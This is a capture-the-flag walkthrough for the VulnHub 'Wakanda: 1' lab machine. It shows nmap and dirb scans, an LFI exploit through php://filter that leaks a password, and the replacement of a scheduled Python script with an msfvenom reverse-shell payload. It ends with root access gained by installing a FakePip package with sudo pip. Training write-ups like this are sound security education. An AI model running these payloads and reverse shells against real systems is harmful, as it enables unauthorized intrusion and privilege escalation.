<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Wakanda: 1 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-wakanda-1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-08-11T11:54:48+00:00">August 11, 2018</time><time class="updated" datetime="2025-06-10T20:29:38+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as <strong>Wakanda</strong> and it is another capture the flag challenge provided for practice. So let’s try to break through it. But before please note that you can download it from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/wakanda-1,251/#download">here</a></span>.</span></p>
<p><span style="color: #000000;"><strong>Security Level: </strong>Intermediate</span></p>
<p><span style="color: #000000;"><strong>Flags:</strong> There are three flags (flag1.txt, flag2.txt, root.txt)</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">HTTP service enumeration</span></li>
<li><span style="color: #000000;">Exploiting LFI using php filter</span></li>
<li><span style="color: #000000;">Decode the base 64 encoded text for password</span></li>
<li><span style="color: #000000;">SSH Login</span></li>
<li><span style="color: #000000;">Get 1<sup>st</sup> Flag</span></li>
<li><span style="color: #000000;">Finding files owned by devops</span></li>
<li><span style="color: #000000;">Overwrite antivirus.py via malicious python code</span></li>
<li><span style="color: #000000;">Get netcat session</span></li>
<li><span style="color: #000000;">Get 2<sup>nd</sup> flag</span></li>
<li><span style="color: #000000;">Sudo Privilege Escalation</span></li>
<li><span style="color: #000000;">Exploit Fake Pip</span></li>
<li><span style="color: #000000;">Get the Root access and Capture the 3rd flag</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>WalkThrough</u></strong></span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<pre class="lang:default decode:true ">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wUXbYsmQcPA/W27JxytxBtI/AAAAAAAAZrQ/kopGcAFYseYtfdg7W5TEApFhJlextTHtQCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We found our target –&gt; 192.168.1.124</span></p>
<p><span style="color: #000000;">Our next step is to scan our target with NMAP.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.124</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mf2lTtaoCw4/W27J2A4BurI/AAAAAAAAZrQ/BYKCMkO3FRgliVL7K2EalwAmhO4q_AxIACEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">The NMAP output shows us that there are 4 ports open: 80 (HTTP), 111 (RPC), 333(SSH), 48920(RPC)</span></p>
<p><span style="color: #000000;">Browsed the URL http://192.168.1.124 and poked around; however, we were not able to get any significant clues to move forward  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8rzQ0xikp6A/W27J2WFJuuI/AAAAAAAAZrM/JV7PoOb4GekiRCccQL_1gdxiHu1ZNlduwCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">We didn’t find anything on the webpage so we use dirb to enumerate the directories.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.124</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S9q4UVM28IQ/W27J22NKWSI/AAAAAAAAZrI/m2jRNqHZgaQTMjykjClWSahzrWVoX315QCEwYBhgL/s1600/4.1.png"/></span></p>
<p><span style="color: #000000;">All the pages that we find in the dirb scan have size zero and we don’t find any content on any of the pages. We take a look at the source page of the index file and we find a “lang” parameter commented inside the page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SXPnuaCTfaQ/W27J3qjx3WI/AAAAAAAAZrQ/jGvApOShXdEmm0VNg7gDh9E_6K69kB4jgCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We use the “lang” parameter, just like it was shown in the page and find the text has been converted into French. Now we check if the “lang” parameter is vulnerable to LFI.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6bINCAgJTAk/W27J3wdmZDI/AAAAAAAAZrM/RWfKciVLgGw7802He6pinbnmHFRABNLVQCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We are able to exploit the LFI vulnerability using “php://filter/convert.base64-encode” function and access the index page.</span></p>
<pre class="lang:default decode:true">curl http://192.168.1.124/?lang=php://filter/convert.base64-encode/resource=index</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-VkEm3WupFzc/W27J4aRz7PI/AAAAAAAAZrU/fgyGsVH9XnUOYyKLIt3BQI7EKQz2OsvrgCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We decode the base64 encoded string and find the password “<strong>Niamey4Ever227!!!</strong>”. On the page, we find that “<strong>mamadou</strong>” is the author. We use these credentials to login through ssh on the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WiG23keB3wE/W27J4kuD4hI/AAAAAAAAZrY/Y65bkhTyibcaWNJA6rHdj2TnMXdtMtFMwCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">When we login through ssh we get a python IDE prompt. We import the pty module and spawn ‘/bin/bash’ shell. We take a look at the home directory for user mamaduo and find the first flag.</span></p>
<pre class="lang:default decode:true">ssh mamaduo@192.168.1.124 -p 3333</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-qBtPrm97Um4/W27JxxsJMgI/AAAAAAAAZrY/O0CV3r6zEJIQs36UHrNGOuQ62v0cYZl6QCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Enumerating through the directories, inside /tmp directory we find a file called test. We open it and find nothing interesting, but when we take a closer look at the file we find it that is owned by a devops. Now we find all the files owned by user devops and find a file called “.antivirus.py” inside /srv directory.</span></p>
<pre class="lang:default decode:true">find / -user devops 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ar89CTFfvH4/W27Jxm0dPGI/AAAAAAAAZrA/OxyU21oMFfM8fHXn1JHoPL7-HMoUGI7TwCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now when we open the python file we find that it is opening and test file and writing “test” inside it. To exploit this, we replace the code with shellcode. First, we create a msfvenom payload.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_python lhost=192.168.1.134 lport=4444 R</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-T_Hgl29-kyU/W27JylqbqzI/AAAAAAAAZrY/FrdaxLB9FUYzot4G8UPsFJbGUopUD9nmgCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">After creating the payload, we open the “. antivirus.py” file and comment out the earlier code and insert our payload without adding “python -c”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-oW4yndSZatQ/W27Jy93Nx9I/AAAAAAAAZrM/XA--GArQ3dkQPJdZlVHpOxhGuOhiJiUhwCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We set up our listener using netcat, we wait for a few minutes for the script to get executed. As soon as the script is executed we get a reverse shell. When we check the UID we find that we spawned a shell for devops. Now we go to /home/devops directory and find the second flag. After getting the second flag we find that we can execute pip is a superuser without root.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-pv7UULRuz50/W27JzEXqOpI/AAAAAAAAZrU/FLXek_2gkfc2MeRivQOPCT6tTR7r7S_BgCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now there is a script called Fakepip (download <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/0x00-0x00/FakePip.git">here</a></span>), that can be used to exploit this vulnerability.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oyTBd0ZX9oQ/W27Jzt87N4I/AAAAAAAAZrM/KSta4pWP0lMldx_BQ1k4XwHW1arVeF51QCEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">We download the fakepip script into our system to edit the payload inside.</span></p>
<pre class="lang:default decode:true">git clone https://github.com/0x00-0x00/FakePip.git</pre>
<p><span style="color: #000000;">We edit the payload inside os.system function.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-flmanQMs9uY/W27J071ETpI/AAAAAAAAZrA/wb0xU-jeYMsv19tTOhB_JXKWE5jqM2mygCEwYBhgL/s1600/17.1.png"/></span></p>
<p><span style="color: #000000;">We decode the base64 encoded string and change the IP address to our IP address. Then we again convert the string to base64 and replace the older string with the new one.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ctLs6VgSLFo/W27J1JnPcYI/AAAAAAAAZrU/GA6-7hfDKJIb_wleTksVddCQ6TpPWmKpwCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">We start the python server on our system so that we can upload the FakePip script into the target machine.</span></p>
<pre class="lang:default decode:true">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-05Wj8Zxg-wY/W27Jz7Eu0eI/AAAAAAAAZrY/TnwCOtVDbU8ElQfcVIp07ItxGTXVilrKgCEwYBhgL/s1600/16.1.png"/></span></p>
<p><span style="color: #000000;">After we start HTTP server, we download the script on the target machine using wget. Now execute the command as per the instructions were given to us on the FakePip readme file.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.134/setup.py
sudo pip install . --upgrade --force-reinstall</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-GnS4AliNaow/W27J1fW24_I/AAAAAAAAZrY/7X6zL6IA9hkQm3eSik3iWwp1L5jVBh72ACEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">As soon as we run the command we get a reverse shell as the root user. We now go to the root directory and find the root flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Jf3Q-59QrmQ/W27J2WncMHI/AAAAAAAAZrE/1G6BZ4jwVoQDfIxDG6qmocaDmFUcxyUJgCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
